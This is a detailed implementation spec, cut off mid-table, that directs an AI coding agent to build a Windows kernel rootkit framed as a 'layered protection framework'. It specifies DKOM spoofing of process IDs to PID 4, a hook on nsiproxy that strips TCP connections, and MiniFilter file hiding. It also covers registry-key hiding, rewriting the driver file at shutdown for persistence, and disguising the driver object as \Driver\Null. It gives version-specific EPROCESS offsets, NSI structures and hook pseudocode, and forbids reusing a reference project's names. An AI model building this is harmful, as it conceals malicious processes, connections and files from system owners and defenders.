# Industrial Agent Prompt: Windows WDM Kernel Driver (Layered Protection Framework)

> **Document type**: Implementation Spec  
> **Audience**: General-purpose AI coding agent  
> **Expected deliverable**: A pure WDM driver (`.sys`) that loads on Windows 7 SP1 through Windows 11 (x86/x64). Functionality MUST cover a reference implementation and **MUST implement the hardenings below**.  
> **Naming constraint**: Neither this document nor Agent-produced code MAY use any original names from a reference project (driver name, service name, pool-tag strings, and so on).

---

## 0. Agent Execution Instructions

You are a senior Windows kernel-driver engineer. Implement a **pure WDM kernel driver** (do not use KMDF/UMDF) strictly per this document, comprising 7 cooperating submodules, and satisfying:

1. **Pure WDM architecture**: VS2010 + WDK 7600.16385.1; link `ntoskrnl.lib;hal.lib;wdm.lib;bufferoverflowK.lib;fltMgr.lib` (see §13).
2. **Registry driver configuration**: A background thread SHALL poll every 5 seconds; rules are semicolon-separated; hot updates MUST NOT require restarting the driver.
3. **Six hide/protect capabilities**: process PID spoofing, TCP connection filtering, file-path MiniFilter hiding, registry-key hiding, driver-file write-back on shutdown, DriverObject metadata clone spoofing.
4. **Non-fatal initialization**: Submodule Init failures MUST only `KdPrint`; they MUST NOT block `DriverEntry` from returning `STATUS_SUCCESS`.
5. **Strict unload order**: Stop the polling thread first, then `Cleanup` in reverse dependency order.
6. **Mandatory hardening**: See §0.1. When a later algorithm conflicts with a hardening item, the hardening item SHALL take precedence.

---

## 0.1 Mandatory Hardenings Relative to a Reference Implementation (MUST implement)

| Limitation | Hardening requirement |
|------|----------|
| NetHide is `#ifdef _WIN64` only; x86 is pass-through | x86 native and WoW64 SHALL share the `NH_NSI_PARAM_X86` (0x3C) completion routine; Win32 builds MUST also filter the TCP table |
| Completion routines may still be running after unhook | Increment `OutstandingIrp++` **only** after a completion routine is successfully injected; **every** completion-routine exit path MUST `--`. Cleanup: restore `DeviceControl` first, then poll with `KeDelayExecutionThread` until the count is 0 or 3 seconds elapse. Pass-through MUST NOT touch the count. |
| Directory filter does not update `IoStatus.Information` after `memmove` | After compacting, write the remaining byte count into `Data->IoStatus.Information` |
| Path is exact-match only; children remain openable after a directory is hidden | Match rule: equal **or** the full path is prefixed by `hidden path + L'\\'` (directory-tree hide) |
| Instances key hard-codes a debug service name | Parse the service name from `DriverEntry`'s `RegistryPath`; create `...\Services\<actual service name>\Instances` |
| Config path hard-codes a service name | `CONFIG_REG_PATH` MUST likewise be concatenated at runtime from `RegistryPath + L"\\Config"`; hard-coding a second name is FORBIDDEN |
| Same-named processes: only the first snapshot entry is spoofed | Walk the snapshot; call `SpoofSinglePid` for **every** process whose image name matches and `pid≠0/4` |
| Old PIDs are not restored when Process rules shrink | **Only when the Process key string changes** (including FirstRun) call `PidSpoofRestoreAll()` first, then spoof the new list. IP/Port/Path/RegPath changes MUST NOT `RestoreAll`. |
| Comparing `HKEY_LOCAL_MACHINE\` as 18 characters leaves a stray `\` on the suffix | After a prefix match, if `*pSuffix==L'\\'` then `pSuffix++` |
| Writeback cleanup does not restore `IRP_MJ_SHUTDOWN` | Save the original pointer before install; write it back on Cleanup (set NULL if there was no original) |
| Submodule headers include `ntddk.h` | The entire project MAY include only `ntifs.h` (already in §1) |
| Directory Post callback does not handle DRAINING | At **PostDirCtrl entry** (before calling WhenSafe) check `FLTFL_POST_OPERATION_DRAINING` and return immediately |
| Registry is exact-match only; subkeys remain openable | PreOpen: full path equal **or** prefixed by `hidden key + L'\\'` → `NOT_FOUND`; PostEnumerate MUST likewise match subkeys by full path |
| DEBUG skips spoofing by default | `DEBUG_SKIP_SPOOF`: 1 in Debug configuration, 0 in Release (MAY use preprocessor `DBG`) |

Public API addition: `PidSpoofRestoreAll(VOID)` — restore every PID in the table and `ObDereferenceObject`.

---

## 1. Project Structure and File Plan

```
<driver_dir>/
├── <DriverName>.sln
├── <DriverName>.vcxproj
├── Driver.c / Driver.h                    # Entry, unload, submodule orchestration
├── RegConfig.c / RegConfig.h              # Registry polling + rule parse/dispatch
├── PidSpoof.c / PidSpoof.h                # EPROCESS UniqueProcessId modification
├── NetHide.c / NetHide.h                  # nsiproxy IRP hook + NSI table filter
├── PathHide.c / PathHide.h                # MiniFilter path hiding
├── RegHide.c / RegHide.h                  # CmRegisterCallbackEx registry hiding
├── WriteBack.c / WriteBack.h              # Driver-file cache and shutdown write-back
├── DriverObjectSpoof.c / DriverObjectSpoof.h  # _DRIVER_OBJECT clone spoofing
└── tools/
    └── CreateTestCert.cmd                 # Test-signing certificate generation (optional)
```

**Windows source-file naming**: MUST be PascalCase. `snake_case` and all-lowercase glued names are FORBIDDEN (for example, do **not** emit `path_hide.c`, `nethide.c`, or `driver.c`). Header and source files MUST share the same base name.

**Unified header policy**: Every `.c/.h` MUST `#include <ntifs.h>` **only** (it is a superset of `ntddk.h`). Including `<ntddk.h>` before `ntifs.h` or from a submodule header is FORBIDDEN; otherwise `PEPROCESS` typedefs collide (C2371). `PathHide.c` additionally requires `<fltKernel.h>`, `<dontuse.h>`, and `<suppress.h>`. Any module that uses `RtlStringCch*` / `RtlStringCb*` additionally requires `<ntstrsafe.h>` (RegConfig / RegHide / PathHide / DriverObjectSpoof).

---

## 2. Global Configuration Macros (RegConfig.h is the hub)

```c
/* Registry config path (kernel format) */
#define CONFIG_REG_PATH_SUFFIX  L"\\Config"
/* Runtime: RtlUnicodeStringCopy(RegistryPath) + append L"\\Config"
 * MUST NOT hard-code the service name in a header. MiniFilter Instances
 * keys likewise hang off RegistryPath. */

#define POLL_INTERVAL_SEC    5
#define VALUE_COUNT          5
#define MAX_VALUE_BYTES      4096
#define POOL_TAG             'CfgX'    /* Custom four-character pool tag; MUST NOT reuse a reference-project literal */

/* Five REG_SZ value names */
#define VAL_PROCESS   L"Process"    /* Process image names, semicolon-separated */
#define VAL_IP        L"IP"         /* Remote IPv4, semicolon-separated */
#define VAL_PORT      L"Port"       /* Local ports, semicolon-separated */
#define VAL_PATH      L"Path"       /* File/directory Win32 paths, semicolon-separated */
#define VAL_REGPATH   L"RegPath"    /* Registry paths, semicolon-separated */

typedef enum {
    ValProcess = 0, ValIP, ValPort, ValPath, ValRegPath
} VALUE_TYPE;
```

**Driver.h debug switch**:

```c
#ifdef DBG
#define DEBUG_SKIP_SPOOF  1   /* Debug: skip spoofing, convenient for WinDbg */
#else
#define DEBUG_SKIP_SPOOF  0   /* Release: perform spoofing */
#endif
#define TARGET_SPOOF_DRIVER L"\\Driver\\Null"
```

**PID spoofing constants**:

```c
#define SPOOF_TARGET_PID  4    /* Spoof as the System process PID */
#define MAX_SPOOF_PIDS    64   /* Spoof table capacity */
```

**RegHide constants**:

```c
#define REGHIDE_MAX_ENTRIES   64
#define REGHIDE_MAX_PATH      512
#define REGHIDE_MAX_REENTRANT 64
```

---

## 3. DriverEntry Initialization Order (strict)

```
DriverObject->DriverUnload = DriverUnload;

1. InitPidSpoof()           /* Detect EPROCESS.UniqueProcessId offset */
2. InitPathHide(DriverObject, RegistryPath)   /* Create Instances under the real service name + register MiniFilter */
3. NetHide_Init()           /* Hook nsiproxy.sys */
4. RegHide_Init(DriverObject) /* Register CmCallback */
5. Writeback_Init(DriverObject) /* Cache .sys + register shutdown notification */
6. RegConfig_StartPolling(RegistryPath) /* Concatenate Config path from the real service key */
7. [if !DEBUG_SKIP_SPOOF] SpoofDriverObject(...)
```

**Writeback MUST be initialized before Spoof**: spoofing modifies `DriverSection`, after which the real driver path can no longer be read.

**Spoof MUST run after Writeback**: in `DriverEntry`, Spoof is the last step.

Each step's failure MUST only `KdPrint`; subsequent steps MUST continue; the function MUST ultimately `return STATUS_SUCCESS`. `DriverUnload` MUST be marked `PAGED_CODE()`.

---

## 4. DriverUnload Cleanup Order (strict)

```
1. RestoreDriverObject(DriverObject, &backup)  /* if already spoofed */
2. RegConfig_StopPolling()    /* KeSetEvent to notify the thread to exit + KeWaitForSingleObject */
3. NetHide_Cleanup()          /* Restore nsiproxy MajorFunction + free the rule list */
4. CleanupPathHide()          /* FltUnregisterFilter + free the path list */
5. CleanupPidSpoof()          /* Restore all spoofed PIDs + ObDereferenceObject */
6. RegHide_Cleanup()          /* CmUnRegisterCallback */
7. Writeback_Cleanup(DriverObject)
```

---

## 5. Submodule A: Registry Configuration Polling (RegConfig.c)

### 5.1 Architecture

- System thread via `PsCreateSystemThread` + `KeWaitForSingleObject(g_StopEvent, timeout=5s)`
- `g_PrevValues[5]` dynamically allocated (MAX_VALUE_BYTES per key); `g_FirstRun` forces processing on the first pass
- Any value change → `NetHide_ResetRules()` → re-run ParseAndValidate on all 5 keys (unchanged keys are also replayed; each module deduplicates / BeginUpdate overwrites)
- **`PidSpoofRestoreAll` MUST be called only when the Process string changed relative to `g_PrevValues[ValProcess]`** (before parsing Process); other key changes only rebuild Net/Path/Reg rules and MUST NOT touch already-spoofed PIDs. Replaying an unchanged Process list MUST NOT call RestoreAll.
- The thread object is retained via `ObReferenceObjectByHandle`; Stop waits infinitely with `KeWaitForSingleObject`
- `ZwQuerySystemInformation` is not exported from ntddk.h and MUST be declared locally; `SystemProcessInformation = 5`
- Process-snapshot entry structure (only ImageName / UniqueProcessId / NextEntryOffset are required):

```c
typedef struct {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime, UserTime, KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount, SessionId;
    ULONG_PTR PageDirectoryBase;
} SYSTEM_PROCESS_INFORMATION_ENTRY;
```

### 5.2 Parse Flow

```
ReadRegSzValue(hKey, name) → valueBuf
ParseAndValidateValue(rawValue, valType, label):
    if ValPath:   PathHide_BeginUpdate()
    if ValRegPath: RegHide_BeginUpdate()
    if ValProcess:  one-shot ZwQuerySystemInformation(SystemProcessInformation)
        /* Initial 64KB; on STATUS_INFO_LENGTH_MISMATCH grow by ReturnLength+0x1000 and retry.
         * MUST cap retries at 8; then skip this poll's process snapshot (do not spoof). */
    Split each item on ';' (itemBuf max 520 characters per item):
        TrimWhitespace(item)
        ValidateAndPrintItem(item, valType):
            ValProcess → ValidateProcess: walk every same-named process in the snapshot → SpoofSinglePid each
            ValIP      → ValidateIPv4 → ParseIPv4WideToUlong → NetHide_AddByRemoteIp(network_order)
            ValPort    → ValidatePort → port>0 and <=65535 → NetHide_AddByLocalPort(host_order)
            ValPath    → TrimTrailingBackslash → ValidatePath → PathHide_AddPath(win32, wcslen)
            ValRegPath → TrimTrailingBackslash → ValidateRegPath → RegHide_AddKey(reg_path)
    if ValPath:   PathHide_EndUpdate()
    if ValRegPath: RegHide_EndUpdate()
```

### 5.3 Validation Rules

| Type | Validation logic | Action on success |
|------|----------|------------|
| Process | Snapshot ImageName match, case-insensitive | `SpoofSinglePid` for **every** same-named instance with `pid≠0/4` |
| IP | IPv4 form `a.b.c.d`, each octet 0–255, leading zeros FORBIDDEN | `ParseIPv4WideToUlong` → little-endian ULONG: `oct[0]|(oct[1]<<8)|...` |
| Port | Decimal 0–65535; **port=0 MUST NOT add a rule** | `NetHide_AddByLocalPort` |
| Path | First concatenate `L"\\??\\"` + Win32 path; `ZwCreateFile` **first** with `FILE_DIRECTORY_FILE` then `FILE_NON_DIRECTORY_FILE` (`DesiredAccess=` `FILE_READ_ATTRIBUTES\|SYNCHRONIZE`, `FILE_OPEN` + `FILE_SHARE_READ` + `FILE_SYNCHRONOUS_IO_NONALERT`). If both fail, discard the item; do not `AddPath` | `PathHide_AddPath` |
| RegPath | Convert HKLM/HKCU/HKCR/HKEY_* etc. to `\Registry\...` then `ZwOpenKey` (`RegHide_MarkReentrant` to prevent recursion) | `RegHide_AddKey` |

### 5.4 Process Polling Logic (after hardening)

- **Only when the Process key string changes** (including FirstRun): call `PidSpoofRestoreAll()` first, then match against the new list. Do **not** RestoreAll when only IP/Port/Path/RegPath change.
- For each semicolon-separated process name, walk **all** snapshot processes whose ImageName matches and `pid≠0/4`, calling `SpoofSinglePid` on each
- `SpoofSinglePid` has built-in dedup: skip if `OriginalPid` is already in the table
- When the table is full (`MAX_SPOOF_PIDS`), subsequent instances are skipped with `KdPrint`
- After the polling thread starts, the first round MUST run **immediately**, then one round every 5 seconds
- If `ZwOpenKey(Config)` fails, the current round MUST NOT change any rules
- A missing or non-`REG_SZ` Config value MUST be treated as an empty string (not as “keep the previous rule set”). Empty Path / RegPath still call BeginUpdate+EndUpdate, which clears that module's hide list. Empty IP / Port after `NetHide_ResetRules` leaves no network rules.

---

## 6. Submodule B: PID Spoofing (PidSpoof.c)

### 6.1 Principle

Directly overwrite the value at the target process `EPROCESS + UniqueProcessIdOffset` with `SPOOF_TARGET_PID (4)`.

### 6.2 Offset Detection Table (DetectUniqueProcessIdOffset)

Look up via `PsGetVersion(&Major, &Minor, &BuildNumber, NULL)`:

**x64 critical Build boundaries** (full `DetectUniqueProcessIdOffset` logic):

| Condition | Offset |
|------|------|
| Major=6, Minor=1 (Win7) | 0x180 |
| Major=6, Minor=2/3 (Win8/8.1) | 0x2E0 |
| Major=10, Build <= 14393 | 0x2E8 |
| Major=10, Build <= 17763 | 0x2E0 |
| Major=10, Build <= 18363 | 0x2E8 |
| Major=10, Build <= 22631 | 0x440 |
| Major=10, Build > 22631 (Win11 24H2+) | 0x1D0 |

**x86**: Build >= 19041 → 0xE4; otherwise 0xB4

Unsupported `Major` (not 6 or 10): x64 MUST fall back to `0x180`; x86 MUST fall back to `0xB4`. Do not refuse `InitPidSpoof` solely because the version is unrecognized.

### 6.3 Data Structures

```c
typedef struct {
    PEPROCESS Process;      /* Reference held via PsLookupProcessByProcessId */
    ULONG     OriginalPid;
    BOOLEAN   Active;
} SPOOF_ENTRY;

static SPOOF_ENTRY g_SpoofTable[MAX_SPOOF_PIDS];
static FAST_MUTEX  g_SpoofMutex;
```

### 6.4 Public API

- `InitPidSpoof()` / `CleanupPidSpoof()` / `SpoofSinglePid(ULONG pid)` / `PidSpoofRestoreAll()`
- `CleanupPidSpoof` and `RestoreAll`: read/write the field at **pointer width**: `PULONG_PTR pPid = (PULONG_PTR)((PUCHAR)Process + Offset); *pPid = (ULONG_PTR)OriginalPid;`. Using only `PULONG` is FORBIDDEN (on x64 the high 4 bytes would be left as garbage).
- `OriginalPid` stores the user PID before spoofing (the incoming `pid`); when spoofing, `*pPid = (ULONG_PTR)SPOOF_TARGET_PID`.

---

## 7. Submodule C: Network Connection Hiding (NetHide.c)

### 7.1 Principle

Hook `\Driver\nsiproxy`'s `MajorFunction[IRP_MJ_DEVICE_CONTROL]`, intercept `IOCTL_NSI_GETALLPARAM (0x12001B)`, and in the IRP completion routine delete matching entries from the TCP connection table.

### 7.2 NSI Structures (x64, stable on Win7–Win10 21H2)

```c
#define IOCTL_NSI_GETALLPARAM  0x12001BUL

/* TCP sub-entry 28 bytes; Port/dwIP are both network byte order */
typedef struct { CHAR _pad0[2]; USHORT Port; ULONG dwIP; CHAR _pad1[20]; } NH_TCP_SUBENTRY;

typedef struct { NH_TCP_SUBENTRY localEntry; NH_TCP_SUBENTRY remoteEntry; } NH_TCP_TABLE_ENTRY; /* 0x38 */

typedef struct { ULONG dwState; CHAR _pad[8]; } NH_STATUS_ENTRY;

typedef struct {
    ULONG dwUdpProId; ULONG _u2; ULONG _u3;
    ULONG dwProcessId;  /* Used by the ByPid filter dimension */
    ULONG _u5; ULONG _u6; ULONG _u7; ULONG _u8;
} NH_PROCESSID_INFO;

/* x64 NSI parameter block, 0x70 bytes */
typedef struct {
    ULONG_PTR _Unk1; SIZE_T _Unk2; PVOID _Unk3; SIZE_T _Unk4;
    ULONG _Unk5; ULONG _Unk6;
    PVOID TcpEntries;       /* -> NH_TCP_TABLE_ENTRY[] */
    SIZE_T EntrySize;       /* expected 0x38 */
    PVOID _Unk9; SIZE_T _Unk10;
    PVOID StatusEntries;    /* -> NH_STATUS_ENTRY[] */
    SIZE_T _Unk12;
    PVOID ProcessIdInfo;    /* -> NH_PROCESSID_INFO[] */
    SIZE_T _Unk14;
    SIZE_T ConnCount;       /* writable: update after filtering */
} NH_NSI_PARAM_X64;

#ifdef _WIN64
/* WoW64 parameter block 0x3C — POINTER_32 truncated user-mode pointers */
typedef struct {
    DWORD _Unk1, _Unk2, _Unk3, _Unk4, _Unk5, _Unk6;
    VOID * POINTER_32 lpMem;
    DWORD EntrySize;
    DWORD _Unk9, _Unk10;
    NH_STATUS_ENTRY * POINTER_32 lpStatus;
    DWORD _Unk12;
    VOID * POINTER_32 ProcessIdInfo;  /* 32-bit user pointer, same as lpMem */
    DWORD _Unk14;
    DWORD TcpConnCount;
} NH_NSI_PARAM_X86;
#else
/* x86 native: same 0x3C layout; pointers are native PVOID; MUST NOT use POINTER_32 */
typedef struct {
    DWORD _Unk1, _Unk2, _Unk3, _Unk4, _Unk5, _Unk6;
    PVOID lpMem;
    DWORD EntrySize;
    DWORD _Unk9, _Unk10;
    PVOID lpStatus;
    DWORD _Unk12;
    PVOID ProcessIdInfo;
    DWORD _Unk14;
    DWORD TcpConnCount;
} NH_NSI_PARAM_X86;
#endif
```

**Hook path selection**:

- x64 kernel: `InputBufferLength == sizeof(NH_NSI_PARAM_X64)` → X64 completion routine; `== sizeof(NH_NSI_PARAM_X86)` → WoW64 completion routine
- **x86 kernel**: `InputBufferLength == sizeof(NH_NSI_PARAM_X86)` → the same completion routine as WoW64 (pointers are native 32-bit; convert directly; POINTER_32 truncation is not required). Leaving a SECURITY_TODO stub is FORBIDDEN.
- WoW64: when assigning `lpMem` / `lpStatus` / `ProcessIdInfo` to `PVOID`, zero-extend the 32-bit user address; MUST `KeStackAttachProcess` before dereferencing.

### 7.3 Hook Flow

**Counting rule (the only convention)**: `InterlockedIncrement(&OutstandingIrp)` ONLY after the completion routine has been successfully written onto the IRP stack. **Every** return path of the completion routine (including SEH and early exits) MUST `InterlockedDecrement`. Pass-through paths for non-target IOCTLs, allocation failure, or unrecognized `InputBufferLength`: MUST **not** add or subtract the count.

```
NhDeviceControlHook:   /* already nsiproxy's MajorFunction */
    sl = IoGetCurrentIrpStackLocation(Irp)
    if ioctl != IOCTL_NSI_GETALLPARAM → return original(...)
    Select completion routine by InputBufferLength; unrecognized → return original(...)
    Allocate NH_HOOKED_IO_COMPLETION; failure → return original(...)
    Save CompletionRoutine/Context/InvokeOnSuccess from the **current sl**
    RequestingProcess = PsGetCurrentProcess(); ObReferenceObject(RequestingProcess)
    Write the new CompletionRoutine/Context onto the **same sl**; Control |= SL_INVOKE_ON_SUCCESS
    InterlockedIncrement(&OutstandingIrp)
    return original(...)

CompletionRoutine:
    First copy context fields into locals (do not touch the freed context afterwards)
    __try { filter the TCP table (see below) } __except { swallow, continue teardown }
    Write back the original CompletionRoutine/Context via **IoGetNextIrpStackLocation**
        (install uses Current, restore uses Next; swapping them is FORBIDDEN)
    Free NH_HOOKED_IO_COMPLETION
    If InvokeOnSuccess and origRoutine != NULL → status = origRoutine(...)
    else:
        If Irp->PendingReturned → IoMarkIrpPending(Irp)
        status = STATUS_SUCCESS
    If RequestingProcess != NULL → ObDereferenceObject (MUST run on every exit, including SEH)
    InterlockedDecrement(&OutstandingIrp)   /* MUST be after calling origRoutine, to prevent Cleanup from racing ahead */
    return status

Filter (when NT_SUCCESS, wrapped in __try):
    KeStackAttachProcess(RequestingProcess)   /* MUST attach BEFORE reading UserBuffer */
    nsiParam = Irp->UserBuffer
    MmIsAddressValid + EntrySize == sizeof(NH_TCP_TABLE_ENTRY)
    NhFilterTcpEntries three-table synchronized memmove
    If StatusEntries or ProcessIdInfo is NULL: still compact TcpEntries; skip memmove on that NULL side table; ByPid MUST NOT match when the pid table is NULL
    Update ConnCount / TcpConnCount
    KeUnstackDetachProcess
```

**Unhook**: first `InterlockedExchangePointer` to restore the original DeviceControl; then loop `KeDelayExecutionThread` (e.g. 50ms) until `OutstandingIrp==0` or 3 seconds have elapsed in total; then free the rule list. Do not Wait on a KEVENT that was never created.

**NhIsHidden port byte order**: Port in the NSI table is network byte order; LocalPort in rules is host byte order; high/low bytes MUST be swapped before comparison.

**Hook install**: `ObReferenceObjectByName(L"\\Driver\\nsiproxy", OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &drv)` → `InterlockedExchangePointer` to replace `MajorFunction[IRP_MJ_DEVICE_CONTROL]`.

**NH_HOOKED_IO_COMPLETION context**:

```c
typedef struct {
    PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
    PVOID                  OriginalContext;
    BOOLEAN                InvokeOnSuccess;
    PEPROCESS              RequestingProcess;
} NH_HOOKED_IO_COMPLETION;
```

### 7.4 Filter Rules

```c
typedef enum {
    NetHideFilterByLocalIp, NetHideFilterByLocalPort,
    NetHideFilterByRemoteIp, NetHideFilterByPid
} NET_HIDE_FILTER_TYPE;

typedef struct {
    NET_HIDE_FILTER_TYPE Type;
    union { ULONG LocalIp; USHORT LocalPort; ULONG RemoteIp; ULONG Pid; };
    CHAR ProcessName[16];  /* reserved; unused by RegConfig */
} NET_HIDE_FILTER_RULE;
```

Linked list + `KSPIN_LOCK`. Rule nodes are allocated from NonPagedPool (the alloc macro automatically `RtlZeroMemory`). `NetHide_ResetRules()` unlinks under the lock and frees outside the lock.

Public API has 4 rule kinds: `AddByLocalIp` / `AddByLocalPort` / `AddByRemoteIp` / `AddByPid`. RegConfig by default fills RemoteIp and LocalPort; the LocalIp/Pid interfaces MUST still be implemented.

Both x86 and x64 MUST be able to filter; the README MUST NOT still say “x64 only”.

---

## 8. Submodule D: Path-Hiding MiniFilter (PathHide.c)

### 8.1 Registration

```c
FLT_OPERATION_REGISTRATION callbacks[] = {
    { IRP_MJ_CREATE, 0, PreCreateCallback, NULL },
    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirCtrlCallback, PostDirCtrlCallback },
    { IRP_MJ_OPERATION_END }
};
FltRegisterFilter(DriverObject, &FilterReg, &Filter);
FltStartFiltering(Filter);
```

`FLT_REGISTRATION`: `FilterUnloadCallback` returns `STATUS_SUCCESS` to allow unload; remaining Instance/GenerateFileName callbacks are NULL. The callback functions themselves MUST **not** be placed in the PAGE section.

Path matching is **exact equality or directory prefix**: after downcasing, `RtlEqualUnicodeString`, or `FullPath` is prefixed by `NtPath + L'\\'` (when a directory is hidden, CREATE and enumeration of children/subdirectories are intercepted together).

### 8.2 Instances Registry Key (mandatory)

On driver Init, `PathHide_EnsureInstancesKey(RegistryPath)`:

1. Take the service name from `RegistryPath` **after the last `\`** (do not use the entire `\Registry\Machine\System\...\Services\Xxx` as the Instance name).
2. `DefaultInstance = L"<ServiceName> Instance"`
3. Create that Instance subkey under `RegistryPath\Instances` (`ZwCreateKey` RootDirectory is the already-opened Instances handle + a relative name; do not concatenate an absolute path again and get it wrong).
4. If it already exists, still write DefaultInstance / Altitude=`370030` / Flags=0 after opening, so they stay consistent with the current service name.

### 8.3 Hide List

- Active list `HideList` + temporary list `NewHideList`, `ERESOURCE HideLock`
- `BeginUpdate()` → clear `NewHideList`
- `AddPath(Win32Path, PathLength)`:
  - `PathHide_Win32ToNtPath`: `\??\X:` → `ZwOpenSymbolicLinkObject` to resolve the volume → concatenate the path → `RtlDowncaseUnicodeString`
  - Dedup inside the temporary list (`RtlEqualUnicodeString`)
  - Node memory layout: `HIDE_ENTRY` + embedded string buffer (NonPagedPool)
- Converted NT path and PostDirCtrl `DirPath + '\\' + FileName` buffers MUST be 1024 WCHARs (`PATHHIDE_MAX_NT`). Longer paths are skipped (not added, not hidden).
- `EndUpdate()`: under exclusive ERESOURCE, **splice list heads** (do not `LIST_ENTRY old = HideList` struct-assign, which corrupts the sentinel):
  1. Local `oldList` `InitializeListHead`
  2. If HideList is non-empty: attach HideList's Flink/Blink to `&oldList`
  3. If NewHideList is non-empty: attach NewHideList to HideList; otherwise `InitializeListHead(&HideList)`
  4. `InitializeListHead(&NewHideList)`, unlock, then walk and free `oldList`

### 8.4 Interception Points

| IRP | Callback | Behavior |
|-----|------|------|
| IRP_MJ_CREATE | PreCreate | `FltGetFileNameInformation(NORMALIZED\|QUERY_DEFAULT)` → downcase → on hit `IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND`, return `FLT_PREOP_COMPLETE` |
| IRP_MJ_DIRECTORY_CONTROL | PreDirCtrl | `FltLockUserBuffer` (`IRP_MN_QUERY_DIRECTORY`) |
| IRP_MJ_DIRECTORY_CONTROL | PostDirCtrl | `FltDoCompletionProcessingWhenSafe` → handle in SafeCallback |

**PostDirCtrl directory filtering**:

- At **PostDirCtrl entry** (**before** calling `FltDoCompletionProcessingWhenSafe`), if `FlagOn(Flags, FLTFL_POST_OPERATION_DRAINING)` then return `FLT_POSTOP_FINISHED_PROCESSING` immediately. Do **not** put the DRAINING check inside SafeCallback.
- If `FltDoCompletionProcessingWhenSafe` returns FALSE, abandon filtering and return `FLT_POSTOP_FINISHED_PROCESSING` directly
- PreDirCtrl calls `FltLockUserBuffer` for `IRP_MN_QUERY_DIRECTORY` to create an MDL
- SafeCallback handles only `IRP_MN_QUERY_DIRECTORY`; if `IoStatus` is not success and is not `STATUS_NO_MORE_FILES`, return
- Use `FltGetFileNameInformation(NORMALIZED|QUERY_DEFAULT)` + `FltParseFileNameInformation` to get the **directory's own** NT path, copy into a writable buffer then `RtlDowncaseUnicodeString`; if it ends with `\` then Length -= 2
- Full entry path = `DirPath + L'\\' + FileName` (the FileName segment is also downcased) then match against the hide list
- Win32 paths MUST be of the form `X:\...` (length ≥ 3, `[1]==':'`, `[2]=='\\'`); otherwise `Win32ToNtPath` returns `STATUS_INVALID_PARAMETER`
- SafeCallback obtains the buffer via `MmGetSystemAddressForMdlSafe` and uses `IoStatus.Information` as the walk bound (not `QueryDirectory.Length`); each step checks `curOff + fnOffset + fileNameLen <= dataSize`
- Supported FileInformationClass: FileDirectoryInformation / FileFullDirectoryInformation / FileBothDirectoryInformation / FileIdBothDirectoryInformation / FileIdFullDirectoryInformation
- FileName offset uses `FIELD_OFFSET(..., FileName)`; NextEntryOffset is at offset 0, FileNameLength at offset 60
- Skip `.` and `..` **by content and length together**: FileName is exactly `.` (Length == 2 bytes) or `..` (Length == 4 bytes). Matching on Length alone is FORBIDDEN (that would hide every 1- and 2-character filename).
- Unlink hidden entries (same class of algorithm as getdents, but using NextEntryOffset):
  - Non-first entry: `*(PULONG)pPrev += nextOffset` (or `*pPrev = 0` if last), then continue from pPrev's new offset
  - First entry with a successor: `RtlMoveMemory(pCur, pCur+nextOffset, dataSize-nextOff)`, `dataSize -= nextOffset`, `continue` without advancing the pointer
  - First entry that is also the last: `IoStatus.Status = STATUS_NO_MORE_FILES` and return
- **After memmove compacting, MUST** `Data->IoStatus.Information = dataSize` (remaining valid bytes)

`FLT_REGISTRATION` initialization: `sizeof(FLT_REGISTRATION)`, `FLT_REGISTRATION_VERSION`, Flags=0, Context=NULL, Callbacks, Unload; the remaining 7 Instance/GenerateFileName callback slots are all NULL.

---

## 9. Submodule E: Registry Key Hiding (RegHide.c)

### 9.1 Registration

```c
CmRegisterCallbackEx(RegistryCallback, &Altitude, DriverObject, NULL, &Cookie, NULL);
/* Altitude string MUST be "370000" (different from MiniFilter's "370030") */
```

### 9.2 Hide List

```c
WCHAR g_HideList[REGHIDE_MAX_ENTRIES][REGHIDE_MAX_PATH];   /* active */
WCHAR g_TempList[REGHIDE_MAX_ENTRIES][REGHIDE_MAX_PATH];   /* temporary */
FAST_MUTEX g_HideListLock;
```

`BeginUpdate/AddKey/EndUpdate` pattern is the same as PathHide.

### 9.3 Callback Handling

| Notification class | Action |
|--------|------|
| RegNtPreOpenKeyEx / RegNtPreCreateKeyEx | Join RootObject full path + CompleteName (rules below); if the full path is equal **or** prefixed by `hidden key + L'\\'` → **STATUS_OBJECT_NAME_NOT_FOUND** |
| RegNtPostEnumerateKey | If a subkey's full path hits the same rule, hide it: `ZwEnumerateKey` loop to find the next visible subkey, copy back into the PreInformation buffer |

**PreOpen path join** (MUST follow this order):

1. If `CompleteName` is NULL → do not hide (return success, do not complete the operation).
2. If `CompleteName->Buffer[0] == L'\\'` → use `CompleteName` as the full path (absolute).
3. Else if `RootObject != NULL` → `ObQueryNameString(RootObject)` + `L'\\'` + `CompleteName`, skipping a duplicate slash.
4. Else → use `CompleteName` as-is.
5. `ObQueryNameString` buffer size: `sizeof(OBJECT_NAME_INFORMATION) + REGHIDE_MAX_PATH * sizeof(WCHAR)`.

**PostEnumerateKey details**:

1. If `post->Status` failed, return SUCCESS (do not change the result)
2. `PreInformation` → `REG_ENUMERATE_KEY_INFORMATION`; `KeyInformation` may be in user mode
3. Inside `__try`, extract Name/NameLength by KeyInformationClass, **copy into a kernel-stack `WCHAR[]`** before comparing (holding a user pointer outside `__try` is FORBIDDEN)
4. `ObQueryNameString(Pre->Object)` yields the parent-key path; concatenate with the subkey name into a full path; judge by the §0.1 prefix rule
5. If not hidden, return as-is
6. If hidden, `ObOpenObjectByPointer` the parent key, `RegHide_MarkReentrant`, `ZwEnumerateKey` from `Index+1` until a visible subkey is found or there are no more
7. Copy the visible subkey's information back into the user `KeyInformation` (length MUST NOT exceed `Length`), update `post->Status`; if none found, `STATUS_NO_MORE_ENTRIES`. If `pre->ResultLength` is non-NULL, write the length returned by `ZwEnumerateKey`.
8. The top-level `RegistryCallback` wraps another `__try/__except`

### 9.4 Reentrancy Protection

`RegHide_MarkReentrant()` / `RegHide_UnmarkReentrant()`: volatile HANDLE array + `InterlockedCompareExchangePointer`; `ValidateRegPath` marks the current thread when it internally `ZwOpenKey`.

Path conversion (`ConvertToKernelPath` / `ValidateRegPath` share the same prefix table):

| User-input prefix | Kernel prefix | Suffix |
|--------------|----------|------|
